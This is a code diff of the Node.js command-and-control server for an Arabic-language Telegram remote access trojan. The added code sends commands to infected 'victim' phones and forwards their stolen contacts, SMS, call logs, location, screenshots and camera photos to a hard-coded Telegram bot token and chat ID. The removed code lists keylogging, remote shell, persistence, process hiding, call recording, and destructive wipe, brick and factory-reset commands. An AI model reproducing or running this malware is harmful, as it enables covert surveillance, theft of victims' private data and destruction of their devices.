@@ -1,345 +1,155 @@
+const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const telegramBot = require('node-telegram-bot-api');
-const https = require('https');
-const multer = require('multer');
+const fs = require('fs');
+
+// ==========================================
+// 1. الإعدادات الأساسية
+// ==========================================
+const token = '8976550250:AAHR7uKjBNzlHgoiBxierxbknbCdrtM_YcQ';
+const chatId = '8737619314'; // ايديك
+const bot = new TelegramBot(token, { polling: true });
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
-const uploader = multer();
+const io = new Server(server, { cors: { origin: "*" } });
 
-// ==========================================
-// 1. البيانات (التوكن الجديد)
-// ==========================================
-const data = {
-    token: "8976550250:AAHR7uKjBNzlHgoiBxierxbknbCdrtM_YcQ",
-    id: "8737619314",
-    host: "https://github.com/rshadhackers2/Telegram-Rat-Arabic",
-    text: "premium feature",
-    adminUsername: "@king_1_4",
-    channel: "t.me/Abu_Yamani",
-    beaconIntervalMs: 5000,
-    version: "2027.1"
-};
-
-const bot = new telegramBot(data.token, { polling: true });
-const appData = new Map();
-
-// ==========================================
-// 2. الأزرار (مدموجة داخل الملف)
-// ==========================================
-const SECTIONS = {
-    '🔍 استطلاع': {
-        '🔍 بصمة النظام':      'sysinfo',
-        '📋 العمليات':         'processes',
-        '🌐 الشبكة':           'netinfo',
-        '📶 WiFi':             'wifi',
-        '🔋 البطارية':         'battery',
-        '📦 التطبيقات':        'installed',
-        '🕐 وقت التشغيل':      'uptime',
-        '📍 الموقع':           'location',
-        '📱 معلومات الجهاز':   'deviceinfo'
-    },
-    '📂 ملفات': {
-        '📂 مدير الملفات':     'filelist',
-        '⬇️ تنزيل ملف':        'filedown',
-        '⬆️ رفع ملف':          'fileup',
-        '🗑️ حذف ملف':          'filedel',
-        '🔎 بحث ملف':          'filesearch',
-        '📝 قراءة ملف':        'fileread',
-        '✏️ كتابة ملف':        'filewrite',
-        '📁 سحب كل الملفات':   'filedump'
-    },
-    '🎬 وسائط': {
-        '🖼️ سحب كل الصور':     'gallery_dump',
-        '🎬 سحب كل الفيديوهات':'video_dump',
-        '📥 تنزيل صورة':       'image_down',
-        '📥 تنزيل فيديو':      'video_down',
-        '📸 لقطة شاشة':        'screenshot',
-        '📷 كاميرا أمامية':    'cam_front',
-        '📷 كاميرا خلفية':     'cam_back',
-        '🎥 تسجيل فيديو':      'video_record',
-        '🎤 تسجيل صوت':        'record',
-        '🎙️ تسجيل مكالمة':     'call_record',
-        '🎵 سحب الصوتيات':     'audio_dump'
-    },
-    '📇 بيانات شخصية': {
-        '📇 جهات الاتصال':     'contacts',
-        '📛 سحب الأسماء':      'names',
-        '📞 سحب المكالمات':    'calls',
-        '💬 سحب الرسائل':      'sms_list',
-        '📤 تصدير الرسائل':    'sms_export',
-        '📨 إرسال SMS':        'sendSms',
-        '📨 SMS للجميع':       'sendSmsAll',
-        '💬 نص للجميع':        'textToAllContacts',
-        '📋 الحافظة':          'clipboard',
-        '📅 التقويم':          'calendar',
-        '🔖 المفضلة':          'bookmarks'
-    },
-    '💻 تنفيذ': {
-        '💻 Remote Shell':     'shell',
-        '⚡ أمر سريع':         'runcmd',
-        '📜 سكربت PS1':        'ps1',
-        '🐍 سكربت Python':     'pyscript',
-        '📦 تثبيت APK':        'install_apk',
-        '▶️ تشغيل تطبيق':      'launch_app',
-        '⏹️ إيقاف تطبيق':      'stop_app',
-        '🔗 فتح رابط':         'openurl'
-    },
-    '🔒 استمرارية': {
-        '🔒 تثبيت الاستمرارية':'persist',
-        '🧹 إزالة الاستمرارية':'unpersist',
-        '🔼 رفع الصلاحيات':    'elevate',
-        '🫥 إخفاء العملية':    'hide',
-        '🎭 تمويه الاسم':      'masquerade',
-        '🔁 إعادة تشغيل':      'restart',
-        '❌ إنهاء الجلسة':     'kill'
-    },
-    '⌨️ مراقبة': {
-        '⌨️ Keylogger تشغيل': 'keylog_on',
-        '⌨️ Keylogger إيقاف': 'keylog_off',
-        '📋 تسليم الضغطات':    'keylog_dump',
-        '🎥 بث الشاشة':        'screenstream',
-        '👁️ مراقبة النشاط':   'activity_monitor',
-        '🔔 إشعار':            'toast',
-        '📳 ذبذبة':            'vibrate'
-    },
-    '💥 تدمير': {
-        '🔒 قفل الشاشة':       'lock_screen',
-        '📵 قطع الشبكة':       'net_kill',
-        '💥 تعطيل الجهاز':     'brick',
-        '🗑️ مسح البيانات':     'wipe_data',
-        '🔥 إعادة ضبط مصنع':   'factory_reset',
-        '⚠️ مسح بطاقة SD':     'wipe_sd',
-        '🚫 حذف التطبيقات':    'uninstall_all',
-        '🔊 رفع الصوت للأقصى': 'max_volume',
-        '📢 رسالة ملء الشاشة': 'fullscreen_msg'
-    },
-    '🎛️ تحكم': {
-        '🔄 تبديل جهاز':       'switch',
-        '📡 إرسال للكل':       'broadcast',
-        '📊 سجل الأوامر':      'logs',
-        '⚙️ إعدادات Beacon':  'settings',
-        '💾 تصدير البيانات':   'export',
-        'ℹ️ عن البوت':         'about'
-    }
-};
-
-const INPUT_PROMPTS = {
-    'filedown':   'أدخل مسار الملف',
-    'fileup':     'أدخل مسار الملف للرفع',
-    'filedel':    'أدخل مسار الملف للحذف',
-    'filesearch': 'أدخل اسم الملف',
-    'fileread':   'أدخل مسار الملف',
-    'filewrite':  'أدخل المسار ثم المحتوى (سطر جديد)',
-    'image_down': 'أدخل مسار الصورة',
-    'video_down': 'أدخل مسار الفيديو',
-    'video_record': 'أدخل مدة التسجيل (ثانية)',
-    'record':     'أدخل مدة التسجيل (ثانية)',
-    'call_record':'أدخل مدة التسجيل (ثانية)',
-    'sendSms':    'أدخل الرقم ثم النص (سطر جديد)',
-    'sendSmsAll': 'أدخل نص الرسالة',
-    'textToAllContacts': 'أدخل النص',
-    'toast':      'أدخل نص الإشعار',
-    'vibrate':    'أدخل المدة (ms)',
-    'openurl':    'أدخل الرابط',
-    'runcmd':     'أدخل الأمر',
-    'shell':      'أدخل الأمر',
-    'install_apk':'أدخل مسار APK',
-    'launch_app': 'أدخل اسم الحزمة',
-    'stop_app':   'أدخل اسم الحزمة',
-    'settings':   'أدخل interval/jitter',
-    'fullscreen_msg': 'أدخل نص الرسالة',
-    'max_volume': 'أدخل مستوى الصوت (0-100)'
-};
-
-// ==========================================
-// 3. دوال البناء
-// ==========================================
-function buildMainKeyboard() {
-    return {
-        keyboard: [
-            ['🔍 استطلاع',      '📂 ملفات'],
-            ['🎬 وسائط',        '📇 بيانات شخصية'],
-            ['💻 تنفيذ',        '🔒 استمرارية'],
-            ['⌨️ مراقبة',       '💥 تدمير'],
-            ['🎛️ تحكم',         '⌖ الأجهزة المتصلة'],
-            ['⌖ التحكم',        '⌖ عن لنا']
-        ],
-        resize_keyboard: true
-    };
-}
-
-function buildSectionKeyboard(sectionName) {
-    const sec = SECTIONS[sectionName];
-    if (!sec) return null;
-    const keys = Object.keys(sec);
-    const rows = [];
-    for (let i = 0; i < keys.length; i += 2) rows.push(keys.slice(i, i + 2));
-    rows.push(['🔙 رجوع']);
-    return { keyboard: rows, resize_keyboard: true, one_time_keyboard: true };
-}
-
-function findCommand(text) {
-    for (const sec of Object.values(SECTIONS)) {
-        if (sec[text]) return sec[text];
-    }
-    return null;
-}
-
-function emitTo(target, event, payload) {
-    if (target === 'all' || !target) io.emit(event, payload);
-    else if (io.sockets.sockets.get(target)) io.to(target).emit(event, payload);
-}
-
-function replyDone(extra = '') {
-    bot.sendMessage(data.id,
-        `<b>⌖ الطلب نُفّذ بنجاح ${extra}\n\n⌖ عودة إلى القائمة الرئيسية</b>\n\n`,
-        { parse_mode: 'HTML', reply_markup: { keyboard: [['⌖ الأجهزة المتصلة', '⌖ التحكم'], ['⌖ عن لنا']], resize_keyboard: true } });
-}
-
-function askInput(prompt) {
-    bot.sendMessage(data.id, `<b>${prompt}</b>\n\n`, {
-        parse_mode: 'HTML',
-        reply_markup: { keyboard: [['⌖ إرسال']], resize_keyboard: true, one_time_keyboard: true }
-    });
-}
-
-// ==========================================
-// 4. معالجة الرسائل والسيرفر
-// ==========================================
 app.use(express.json());
-app.post('/upload', uploader.single('file'), (req, res) => {
-    if (!req.file) return res.status(400).send('no file');
-    bot.sendDocument(data.id, req.file.buffer, { caption: `<b>📁 ملف مستلم من → ${req.body.target || 'unknown'}</b>`, parse_mode: 'HTML' });
-    res.send('Done');
-});
 
-io.on('connection', (socket) => {
-    const hdr = socket.handshake.headers;
-    const botId = `${hdr['x-forwarded-for'] || 'local'}-${io.engine.clientsCount}`;
-    const ip = hdr['x-forwarded-for'] || socket.handshake.address || 'unknown';
-    const model = hdr['model'] || hdr['user-agent'] || 'unknown';
-    socket.botId = botId;
-    socket.ipAddr = ip;
-    socket.model = model;
-    bot.sendMessage(data.id, `<b>⌖ جهاز جديد متصل</b>\n\nID → ${botId}\nIP → ${ip}\nالجهاز → ${model}\n`, { parse_mode: 'HTML' });
-    socket.on('disconnect', () => bot.sendMessage(data.id, `<b>⌖ جهاز انقطع الاتصال</b>\n\nID → ${botId}\n`, { parse_mode: 'HTML' }));
-    socket.on('result', (payload) => {
-        try {
-            if (!payload || !payload.type) return;
-            const { type, text, base64, filename } = payload;
-            if (type === 'text' && text) bot.sendMessage(data.id, `<b>⌖ نتيجة من ${botId}:</b>\n\n${text}`, { parse_mode: 'HTML' });
-            else if (type === 'photo' && base64) bot.sendPhoto(data.id, Buffer.from(base64, 'base64'), { caption: `📸 من ${botId}` });
-            else if (type === 'file' && base64) bot.sendDocument(data.id, Buffer.from(base64, 'base64'), { caption: `📁 ${filename || 'file'}` });
-        } catch (e) {}
-    });
-});
+let currentAction = null;
+
+// ==========================================
+// 2. قوائم الأزرار
+// ==========================================
+const mainKeyboard = { reply_markup: { keyboard: [
+    [{ text: '📇 بيانات شخصية' }, { text: '📁 سحب الملفات' }],
+    [{ text: '🖼️ سحب الصور' }, { text: '🎬 سحب الفيديوهات' }],
+    [{ text: '📍 الموقع' }, { text: '📱 معلومات الجهاز' }],
+    [{ text: '📸 لقطة شاشة' }, { text: '📷 كاميرا أمامية' }],
+    [{ text: '🔦 المصباح' }, { text: '📢 إشعار' }],
+    [{ text: '⌖ الأجهزة المتصلة' }, { text: '⌖ عن لنا' }]
+], resize_keyboard: true } };
+
+const dataKeyboard = { reply_markup: { keyboard: [
+    [{ text: '📇 جهات الاتصال' }, { text: '💬 سحب الرسائل' }],
+    [{ text: '📞 سحب المكالمات' }, { text: '🔙 رجوع' }]
+], resize_keyboard: true } };
+
+const countKeyboard = { reply_markup: { keyboard: [
+    [{ text: '5' }, { text: '10' }, { text: '20' }],
+    [{ text: '50' }, { text: '100' }],
+    [{ text: '🔙 رجوع' }]
+], resize_keyboard: true, one_time_keyboard: true } };
+
+// ==========================================
+// 3. أوامر البوت
+// ==========================================
+bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, '⌖ اختر من القائمة:', mainKeyboard));
 
 bot.on('message', (msg) => {
     const text = msg.text;
-    if (!text) return;
-
-    if (text === '/start') {
-        bot.sendMessage(data.id, `<b>⌖ مرحبا بك في بوت v${data.version}</b>\n\n⌖ القناة: ${data.channel}\n⌖ المطور: ${data.adminUsername}\n\nاختر من القائمة:</b>\n\n`, { parse_mode: 'HTML', reply_markup: buildMainKeyboard() });
-        return;
-    }
-
-    if (SECTIONS[text]) {
-        if (!appData.get('currentTarget')) {
-            bot.sendMessage(data.id, '<b>⌖ اختر جهازاً أولاً من ⌖ التحكم</b>', { parse_mode: 'HTML' });
-            return;
-        }
-        bot.sendMessage(data.id, `<b>${text} — اختر الأمر:</b>`, { parse_mode: 'HTML', reply_markup: buildSectionKeyboard(text) });
-        return;
-    }
+    const id = msg.chat.id;
+    if (!text || text === '/start') return;
 
     if (text === '🔙 رجوع') {
-        bot.sendMessage(data.id, '<b>⌖ القائمة الرئيسية</b>', { parse_mode: 'HTML', reply_markup: buildMainKeyboard() });
+        currentAction = null;
+        return bot.sendMessage(id, 'القائمة الرئيسية:', mainKeyboard);
+    }
+
+    if (text === '⌖ عن لنا') return bot.sendMessage(id, '⌖ المطور: @king_1_4');
+    if (text === '⌖ الأجهزة المتصلة') return bot.sendMessage(id, '⌖ لا تتوفر أجهزة متصلة ✖️');
+
+    // القوائم
+    if (text === '📇 بيانات شخصية') return bot.sendMessage(id, 'اختر:', dataKeyboard);
+    
+    // طلب العدد
+    if (['📇 جهات الاتصال', '💬 سحب الرسائل', '📞 سحب المكالمات', '📁 سحب الملفات', '🖼️ سحب الصور', '🎬 سحب الفيديوهات'].includes(text)) {
+        currentAction = text;
+        return bot.sendMessage(id, 'اختر العدد (كل ملف فيه 50 سجل):', countKeyboard);
+    }
+
+    // تنفيذ الأزرار الفورية
+    if (text === '📍 الموقع') {
+        bot.sendMessage(id, '⏳ جاري طلب الموقع...');
+        io.emit('command', { action: 'location' });
         return;
     }
 
-    const cmd = findCommand(text);
-    if (cmd) {
-        const target = appData.get('currentTarget');
-        if (!target) {
-            bot.sendMessage(data.id, '<b>⌖ اختر جهازاً أولاً</b>', { parse_mode: 'HTML' });
-            return;
-        }
-        if (INPUT_PROMPTS[cmd]) {
-            appData.set('pendingCmd', cmd);
-            appData.set('currentAction', 'awaitInput');
-            askInput(INPUT_PROMPTS[cmd]);
-            return;
-        }
-        emitTo(target, 'commend', { request: cmd, extras: [] });
-        replyDone(`→ ${text}`);
+    if (text === '📱 معلومات الجهاز') {
+        bot.sendMessage(id, '⏳ جاري طلب معلومات الجهاز...');
+        io.emit('command', { action: 'deviceinfo' });
         return;
     }
 
-    if (appData.get('currentAction') === 'awaitInput') {
-        const target = appData.get('currentTarget');
-        const pending = appData.get('pendingCmd');
-        const val = text || '';
-        const extras = [{ key: 'text', value: val }, { key: 'number', value: val }, { key: 'duration', value: val }, { key: 'url', value: val }, { key: 'path', value: val }, { key: 'command', value: val }, { key: 'package', value: val }, { key: 'content', value: val }];
-        emitTo(target, 'commend', { request: pending, extras });
-        appData.delete('pendingCmd');
-        appData.delete('currentAction');
-        replyDone(`→ ${pending}`);
+    if (text === '📸 لقطة شاشة') {
+        bot.sendMessage(id, '⏳ جاري التقاط الشاشة...');
+        io.emit('command', { action: 'screenshot' });
         return;
     }
 
-    if (text === '⌖ الأجهزة المتصلة') {
-        const socks = io.sockets.sockets;
-        if (socks.size === 0) {
-            bot.sendMessage(data.id, '<b>⌖ لا تتوفر أجهزة متصلة ✖️</b>', { parse_mode: 'HTML' });
-            return;
-        }
-        let out = `<b>⌖ عدد الأجهزة المتصلة: ${socks.size}</b>\n\n`;
-        let i = 1;
-        socks.forEach((s) => {
-            out += `<b>⌖ جهاز ${i}</b>\nID → ${s.botId || s.id}\nIP → ${s.ipAddr || '?'}\nالجهاز → ${s.model || '?'}\n\n`;
-            i++;
-        });
-        bot.sendMessage(data.id, out, { parse_mode: 'HTML' });
+    if (text === '📷 كاميرا أمامية') {
+        bot.sendMessage(id, '⏳ جاري التقاط صورة...');
+        io.emit('command', { action: 'camera' });
         return;
     }
 
-    if (text === '⌖ التحكم') {
-        const socks = io.sockets.sockets;
-        if (socks.size === 0) {
-            bot.sendMessage(data.id, '<b>⌖ لا تتوفر أجهزة متصلة ✖️</b>', { parse_mode: 'HTML' });
-            return;
-        }
-        const rows = [];
-        socks.forEach((s) => rows.push([s.botId || s.id]));
-        rows.push(['all']);
-        rows.push(['⌖ عن لنا']);
-        bot.sendMessage(data.id, '<b>⌖ اختر جهازاً للتنفيذ:</b>', { parse_mode: 'HTML', reply_markup: { keyboard: rows, resize_keyboard: true, one_time_keyboard: true } });
+    if (text === '🔦 المصباح') {
+        io.emit('command', { action: 'torch' });
+        bot.sendMessage(id, '🔦 تم إرسال الأمر');
         return;
     }
 
-    if (io.sockets.sockets.has(text) || text === 'all') {
-        appData.set('currentTarget', text);
-        bot.sendMessage(data.id, `<b>⌖ تم اختيار: ${text}</b>\nاختر الأمر:`, { parse_mode: 'HTML', reply_markup: buildMainKeyboard() });
+    if (text === '📢 إشعار') {
+        io.emit('command', { action: 'notification' });
+        bot.sendMessage(id, '📢 تم إرسال الإشعار');
         return;
     }
 
-    if (text === '⌖ عن لنا') {
-        bot.sendMessage(data.id, `<b>⌖ ${data.channel}\n⌖ المطور: ${data.adminUsername}\n⌖ الإصدار: ${data.version}</b>`, { parse_mode: 'HTML', reply_markup: buildMainKeyboard() });
+    // تنفيذ السحب حسب العدد
+    if (['5', '10', '20', '50', '100'].includes(text) && currentAction) {
+        let limit = parseInt(text);
+        const action = currentAction;
+        currentAction = null;
+        
+        io.emit('command', { action: action, limit: limit });
+        bot.sendMessage(id, `⏳ تم إرسال الأمر للضحية لسحب ${limit} من ${action}...`);
         return;
     }
 });
 
 // ==========================================
-// 5. التشغيل
+// 4. استقبال البيانات من التطبيق (الضحية)
 // ==========================================
-setInterval(() => {
-    io.sockets.sockets.forEach((s) => io.to(s.id).emit('ping', {}));
-}, data.beaconIntervalMs || 5000);
+app.post('/api/data', (req, res) => {
+    const data = req.body;
+    if (!data) return res.status(400).send('No data');
 
-server.listen(process.env.PORT || 3000, () => {
-    console.log(`[v${data.version}] Listening on port 3000`);
+    if (data.type === 'location') {
+        const { lat, lon } = data;
+        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        bot.sendPhoto(chatId, `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x300&markers=color:red%7C${lat},${lon}`, { caption: `📍 الموقع:\n${mapUrl}` });
+    } 
+    else if (data.type === 'contacts' || data.type === 'sms' || data.type === 'calls') {
+        const filePath = `./${data.type}_${Date.now()}.txt`;
+        fs.writeFileSync(filePath, data.content);
+        bot.sendDocument(chatId, filePath, { caption: `✅ تم استلام ${data.type}` }).then(() => fs.unlinkSync(filePath));
+    }
+    else if (data.type === 'deviceinfo') {
+        bot.sendMessage(chatId, `📱 معلومات الجهاز:\n${data.content}`);
+    }
+    else if (data.type === 'screenshot' || data.type === 'camera') {
+        const buffer = Buffer.from(data.content, 'base64');
+        bot.sendPhoto(chatId, buffer, { caption: `📸 ${data.type}` });
+    }
+
+    res.send('OK');
+});
+
+// ==========================================
+// 5. تشغيل السيرفر
+// ==========================================
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`[Server] Listening on port ${PORT}`);
 });
